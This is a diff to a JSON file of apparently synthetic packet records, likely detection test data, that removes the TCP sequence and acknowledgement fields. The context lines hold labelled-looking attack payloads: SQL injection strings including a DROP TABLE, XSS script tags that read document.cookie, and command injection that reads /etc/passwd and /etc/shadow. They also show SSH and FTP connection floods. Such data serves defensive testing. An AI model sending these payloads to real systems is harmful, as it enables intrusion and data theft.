@@ -10,9 +10,7 @@
     "flags": "PA",
     "payload": "GET /index.html HTTP/1.1",
     "payload_len": 24,
-    "flow_id": "192.168.1.10:51234->192.168.1.20:80/TCP",
-    "tcp_seq": 279594896,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51234->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.050",
@@ -25,9 +23,7 @@
     "flags": "PA",
     "payload": "HTTP/1.1 200 OK\r\nContent-Length: 1234",
     "payload_len": 37,
-    "flow_id": "192.168.1.10:51235->192.168.1.20:80/TCP",
-    "tcp_seq": 503383282,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51235->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.100",
@@ -40,9 +36,7 @@
     "flags": "PA",
     "payload": "GET /about.html HTTP/1.1",
     "payload_len": 24,
-    "flow_id": "192.168.1.10:51236->192.168.1.20:80/TCP",
-    "tcp_seq": 279698444,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51236->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.150",
@@ -55,9 +49,7 @@
     "flags": "PA",
     "payload": "GET /api/users HTTP/1.1",
     "payload_len": 23,
-    "flow_id": "192.168.1.10:51237->192.168.1.20:80/TCP",
-    "tcp_seq": 151714640,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51237->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.200",
@@ -70,9 +62,7 @@
     "flags": "PA",
     "payload": "POST /api/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"user\":\"admin\"}",
     "payload_len": 76,
-    "flow_id": "192.168.1.10:51238->192.168.1.20:80/TCP",
-    "tcp_seq": 75822477,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51238->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.250",
@@ -85,9 +75,7 @@
     "flags": "PA",
     "payload": "HTTP/1.1 401 Unauthorized",
     "payload_len": 25,
-    "flow_id": "192.168.1.10:51239->192.168.1.20:80/TCP",
-    "tcp_seq": 811400070,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51239->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.300",
@@ -100,9 +88,7 @@
     "flags": "PA",
     "payload": "GET /static/style.css HTTP/1.1",
     "payload_len": 30,
-    "flow_id": "192.168.1.10:51240->192.168.1.20:80/TCP",
-    "tcp_seq": 336550260,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51240->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.350",
@@ -115,9 +101,7 @@
     "flags": "PA",
     "payload": "GET /favicon.ico HTTP/1.1",
     "payload_len": 25,
-    "flow_id": "192.168.1.10:51241->192.168.1.20:80/TCP",
-    "tcp_seq": 393341747,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51241->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.400",
@@ -130,9 +114,7 @@
     "flags": "PA",
     "payload": "SSH-2.0-OpenSSH_8.9",
     "payload_len": 19,
-    "flow_id": "192.168.1.10:52000->192.168.1.20:22/TCP",
-    "tcp_seq": 544249691,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:52000->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.450",
@@ -145,9 +127,7 @@
     "flags": "PA",
     "payload": "SSH-2.0-OpenSSH_9.0",
     "payload_len": 19,
-    "flow_id": "192.168.1.10:52001->192.168.1.20:22/TCP",
-    "tcp_seq": 58668367,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:52001->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.500",
@@ -160,9 +140,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.10:52002->192.168.1.20:22/TCP",
-    "tcp_seq": 267346804,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:52002->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.550",
@@ -175,9 +153,7 @@
     "flags": "SA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.10:52003->192.168.1.20:22/TCP",
-    "tcp_seq": 803498937,
-    "tcp_ack": 386189071
+    "flow_id": "192.168.1.10:52003->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.600",
@@ -190,9 +166,7 @@
     "flags": "PA",
     "payload": "USER anonymous\r\n",
     "payload_len": 16,
-    "flow_id": "192.168.1.10:53000->192.168.1.20:21/TCP",
-    "tcp_seq": 110103500,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:53000->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.650",
@@ -205,9 +179,7 @@
     "flags": "PA",
     "payload": "331 Please specify the password.\r\n",
     "payload_len": 34,
-    "flow_id": "192.168.1.10:53001->192.168.1.20:21/TCP",
-    "tcp_seq": 845520053,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:53001->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.700",
@@ -220,9 +192,7 @@
     "flags": "PA",
     "payload": "PASS guest@example.com\r\n",
     "payload_len": 24,
-    "flow_id": "192.168.1.10:53002->192.168.1.20:21/TCP",
-    "tcp_seq": 268034535,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:53002->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.750",
@@ -235,9 +205,7 @@
     "flags": "PA",
     "payload": "230 Login successful.\r\n",
     "payload_len": 23,
-    "flow_id": "192.168.1.10:53003->192.168.1.20:21/TCP",
-    "tcp_seq": 880004973,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:53003->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.800",
@@ -250,9 +218,7 @@
     "flags": "PA",
     "payload": "LIST\r\n",
     "payload_len": 6,
-    "flow_id": "192.168.1.10:53004->192.168.1.20:21/TCP",
-    "tcp_seq": 97189541,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:53004->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.850",
@@ -265,9 +231,7 @@
     "flags": "PA",
     "payload": "150 Here comes the directory listing.\r\n",
     "payload_len": 39,
-    "flow_id": "192.168.1.10:53005->192.168.1.20:21/TCP",
-    "tcp_seq": 535532233,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:53005->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.900",
@@ -280,9 +244,7 @@
     "flags": "",
     "payload": "\\x00\\x01\\x00\\x00",
     "payload_len": 4,
-    "flow_id": "192.168.1.10:54001->8.8.8.8:53/UDP",
-    "tcp_seq": null,
-    "tcp_ack": null
+    "flow_id": "192.168.1.10:54001->8.8.8.8:53/UDP"
   },
   {
     "timestamp": "2026-07-08T10:00:00.950",
@@ -295,9 +257,7 @@
     "flags": "",
     "payload": "\\x00\\x01\\x81\\x80",
     "payload_len": 4,
-    "flow_id": "8.8.8.8:53->192.168.1.10:54001/UDP",
-    "tcp_seq": null,
-    "tcp_ack": null
+    "flow_id": "8.8.8.8:53->192.168.1.10:54001/UDP"
   },
   {
     "timestamp": "2026-07-08T10:00:01.000",
@@ -310,9 +270,7 @@
     "flags": "",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.10:None->192.168.1.20:None/ICMP",
-    "tcp_seq": null,
-    "tcp_ack": null
+    "flow_id": "192.168.1.10:None->192.168.1.20:None/ICMP"
   },
   {
     "timestamp": "2026-07-08T10:00:01.050",
@@ -325,9 +283,7 @@
     "flags": "",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:None->192.168.1.10:None/ICMP",
-    "tcp_seq": null,
-    "tcp_ack": null
+    "flow_id": "192.168.1.20:None->192.168.1.10:None/ICMP"
   },
   {
     "timestamp": "2026-07-08T10:00:06.100",
@@ -340,9 +296,7 @@
     "flags": "PA",
     "payload": "GET /login.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1",
     "payload_len": 72,
-    "flow_id": "192.168.1.10:55000->192.168.1.20:80/TCP",
-    "tcp_seq": 325765872,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:55000->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:06.150",
@@ -355,9 +309,7 @@
     "flags": "PA",
     "payload": "GET /search?q=' OR 1=1-- HTTP/1.1",
     "payload_len": 33,
-    "flow_id": "192.168.1.10:55001->192.168.1.20:80/TCP",
-    "tcp_seq": 174735506,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:55001->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:06.200",
@@ -370,9 +322,7 @@
     "flags": "PA",
     "payload": "POST /api/query HTTP/1.1\r\n\r\nSELECT * FROM admin WHERE id=1 UNION SELECT null,version()",
     "payload_len": 86,
-    "flow_id": "192.168.1.10:55002->192.168.1.20:80/TCP",
-    "tcp_seq": 85710284,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:55002->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:06.250",
@@ -385,9 +335,7 @@
     "flags": "PA",
     "payload": "GET /product.php?id=1' OR '1'='1 HTTP/1.1",
     "payload_len": 41,
-    "flow_id": "192.168.1.10:55003->192.168.1.20:80/TCP",
-    "tcp_seq": 75459698,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:55003->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:06.300",
@@ -400,9 +348,7 @@
     "flags": "PA",
     "payload": "GET /report?sort=1; DROP TABLE users-- HTTP/1.1",
     "payload_len": 47,
-    "flow_id": "192.168.1.10:55004->192.168.1.20:80/TCP",
-    "tcp_seq": 85390577,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:55004->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:06.350",
@@ -415,9 +361,7 @@
     "flags": "PA",
     "payload": "GET /item?id=1' OR 1=1 HTTP/1.1",
     "payload_len": 31,
-    "flow_id": "192.168.1.10:55005->192.168.1.20:80/TCP",
-    "tcp_seq": 76726565,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:55005->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:06.400",
@@ -430,9 +374,7 @@
     "flags": "PA",
     "payload": "POST /login HTTP/1.1\r\n\r\nusername=admin' OR 1=1--&password=x",
     "payload_len": 59,
-    "flow_id": "192.168.1.10:55006->192.168.1.20:80/TCP",
-    "tcp_seq": 102766808,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:55006->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:11.450",
@@ -445,9 +387,7 @@
     "flags": "PA",
     "payload": "GET /comment?text=<script>alert(1)</script> HTTP/1.1",
     "payload_len": 52,
-    "flow_id": "192.168.1.11:56000->192.168.1.20:80/TCP",
-    "tcp_seq": 240825805,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.11:56000->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:11.500",
@@ -460,9 +400,7 @@
     "flags": "PA",
     "payload": "POST /profile HTTP/1.1\r\n\r\nbio=<script>alert(document.cookie)</script>",
     "payload_len": 69,
-    "flow_id": "192.168.1.11:56001->192.168.1.20:80/TCP",
-    "tcp_seq": 70250699,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.11:56001->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:11.550",
@@ -475,9 +413,7 @@
     "flags": "PA",
     "payload": "GET /search?q=<script>alert('xss')</script> HTTP/1.1",
     "payload_len": 52,
-    "flow_id": "192.168.1.11:56002->192.168.1.20:80/TCP",
-    "tcp_seq": 323025204,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.11:56002->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:11.600",
@@ -490,9 +426,7 @@
     "flags": "PA",
     "payload": "POST /feedback HTTP/1.1\r\n\r\nmsg=<SCRIPT>alert(1)</SCRIPT>",
     "payload_len": 56,
-    "flow_id": "192.168.1.11:56003->192.168.1.20:80/TCP",
-    "tcp_seq": 245409189,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.11:56003->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:11.650",
@@ -505,9 +439,7 @@
     "flags": "PA",
     "payload": "GET /page?name=<script>confirm(1)</script> HTTP/1.1",
     "payload_len": 51,
-    "flow_id": "192.168.1.11:56004->192.168.1.20:80/TCP",
-    "tcp_seq": 147047046,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.11:56004->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:11.700",
@@ -520,9 +452,7 @@
     "flags": "PA",
     "payload": "GET /redirect?url=javascript:<script>alert(1)</script> HTTP/1.1",
     "payload_len": 63,
-    "flow_id": "192.168.1.11:56005->192.168.1.20:80/TCP",
-    "tcp_seq": 243144200,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.11:56005->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:16.750",
@@ -535,9 +465,7 @@
     "flags": "PA",
     "payload": "GET /faxsurvey?/bin/cat%20/etc/passwd HTTP/1.1",
     "payload_len": 46,
-    "flow_id": "192.168.1.12:57000->192.168.1.20:80/TCP",
-    "tcp_seq": 134630236,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.12:57000->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:16.800",
@@ -550,9 +478,7 @@
     "flags": "PA",
     "payload": "GET /cgi-bin/test?cmd=/bin/cat%20/etc/passwd HTTP/1.1",
     "payload_len": 53,
-    "flow_id": "192.168.1.12:57001->192.168.1.20:80/TCP",
-    "tcp_seq": 61990474,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.12:57001->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:16.850",
@@ -565,9 +491,7 @@
     "flags": "PA",
     "payload": "GET /faxsurvey?/bin/ls%20-la HTTP/1.1",
     "payload_len": 37,
-    "flow_id": "192.168.1.12:57002->192.168.1.20:80/TCP",
-    "tcp_seq": 36312785,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.12:57002->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:16.900",
@@ -580,9 +504,7 @@
     "flags": "PA",
     "payload": "GET /admin/exec?cmd=/bin/cat%20/etc/shadow HTTP/1.1",
     "payload_len": 51,
-    "flow_id": "192.168.1.12:57003->192.168.1.20:80/TCP",
-    "tcp_seq": 200002222,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.12:57003->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:20.000",
@@ -595,9 +517,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43210->192.168.1.20:22/TCP",
-    "tcp_seq": 134824913,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43210->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:20.100",
@@ -610,9 +530,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43210/TCP",
-    "tcp_seq": 580278157,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43210/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:22.000",
@@ -625,9 +543,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43211->192.168.1.20:22/TCP",
-    "tcp_seq": 177681085,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43211->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:22.100",
@@ -640,9 +556,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43211/TCP",
-    "tcp_seq": 567647107,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43211/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:24.000",
@@ -655,9 +569,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43212->192.168.1.20:22/TCP",
-    "tcp_seq": 231224660,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43212->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:24.100",
@@ -670,9 +582,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43212/TCP",
-    "tcp_seq": 523172247,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43212/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:26.000",
@@ -685,9 +595,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43213->192.168.1.20:22/TCP",
-    "tcp_seq": 357971245,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43213->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:26.100",
@@ -700,9 +608,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43213/TCP",
-    "tcp_seq": 886965234,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43213/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:28.000",
@@ -715,9 +621,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43214->192.168.1.20:22/TCP",
-    "tcp_seq": 44744890,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43214->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:28.100",
@@ -730,9 +634,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43214/TCP",
-    "tcp_seq": 589789996,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43214/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:30.000",
@@ -745,9 +647,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43215->192.168.1.20:22/TCP",
-    "tcp_seq": 14862784,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43215->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:30.100",
@@ -760,9 +660,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43215/TCP",
-    "tcp_seq": 703540435,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43215/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:32.000",
@@ -775,9 +673,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43216->192.168.1.20:22/TCP",
-    "tcp_seq": 247501928,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43216->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:32.100",
@@ -790,9 +686,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43216/TCP",
-    "tcp_seq": 894540208,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43216/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:34.000",
@@ -805,9 +699,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43217->192.168.1.20:22/TCP",
-    "tcp_seq": 302181435,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43217->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:34.100",
@@ -820,9 +712,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43217/TCP",
-    "tcp_seq": 826533084,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43217/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:36.000",
@@ -835,9 +725,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43218->192.168.1.20:22/TCP",
-    "tcp_seq": 320479137,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43218->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:36.100",
@@ -850,9 +738,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43218/TCP",
-    "tcp_seq": 746522329,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43218/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:38.000",
@@ -865,9 +751,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43219->192.168.1.20:22/TCP",
-    "tcp_seq": 37097279,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43219->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:38.100",
@@ -880,9 +764,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43219/TCP",
-    "tcp_seq": 539614615,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43219/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:40.000",
@@ -895,9 +777,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43220->192.168.1.20:22/TCP",
-    "tcp_seq": 310929285,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43220->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:40.100",
@@ -910,9 +790,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43220/TCP",
-    "tcp_seq": 827075388,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43220/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:42.000",
@@ -925,9 +803,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43221->192.168.1.20:22/TCP",
-    "tcp_seq": 394329604,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43221->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:42.100",
@@ -940,9 +816,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43221/TCP",
-    "tcp_seq": 592479231,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43221/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:44.000",
@@ -955,9 +829,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43222->192.168.1.20:22/TCP",
-    "tcp_seq": 100290093,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43222->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:44.100",
@@ -970,9 +842,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43222/TCP",
-    "tcp_seq": 611181460,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43222/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:46.000",
@@ -985,9 +855,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43223->192.168.1.20:22/TCP",
-    "tcp_seq": 173452868,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43223->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:46.100",
@@ -1000,9 +868,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43223/TCP",
-    "tcp_seq": 891356507,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43223/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:48.000",
@@ -1015,9 +881,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43224->192.168.1.20:22/TCP",
-    "tcp_seq": 15875532,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43224->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:48.100",
@@ -1030,9 +894,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43224/TCP",
-    "tcp_seq": 604365866,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43224/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:50.000",
@@ -1045,9 +907,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43225->192.168.1.20:22/TCP",
-    "tcp_seq": 151590147,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43225->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:50.100",
@@ -1060,9 +920,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43225/TCP",
-    "tcp_seq": 874416179,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43225/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:52.000",
@@ -1075,9 +933,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43226->192.168.1.20:22/TCP",
-    "tcp_seq": 165641269,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43226->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:52.100",
@@ -1090,9 +946,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43226/TCP",
-    "tcp_seq": 791761014,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43226/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:54.000",
@@ -1105,9 +959,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.99:43227->192.168.1.20:22/TCP",
-    "tcp_seq": 171581205,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.99:43227->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:00:54.100",
@@ -1120,9 +972,7 @@
     "flags": "RA",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.20:22->192.168.1.99:43227/TCP",
-    "tcp_seq": 738025159,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.20:22->192.168.1.99:43227/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:00.000",
@@ -1135,9 +985,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.98:58000->192.168.1.20:21/TCP",
-    "tcp_seq": 322197002,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.98:58000->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:03.000",
@@ -1150,9 +998,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.98:58001->192.168.1.20:21/TCP",
-    "tcp_seq": 75427354,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.98:58001->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:06.000",
@@ -1165,9 +1011,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.98:58002->192.168.1.20:21/TCP",
-    "tcp_seq": 182633553,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.98:58002->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:09.000",
@@ -1180,9 +1024,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.98:58003->192.168.1.20:21/TCP",
-    "tcp_seq": 132155140,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.98:58003->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:12.000",
@@ -1195,9 +1037,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.98:58004->192.168.1.20:21/TCP",
-    "tcp_seq": 75725217,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.98:58004->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:20.000",
@@ -1210,9 +1050,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60000->192.168.1.20:21/TCP",
-    "tcp_seq": 32698614,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60000->192.168.1.20:21/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:21.500",
@@ -1225,9 +1063,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
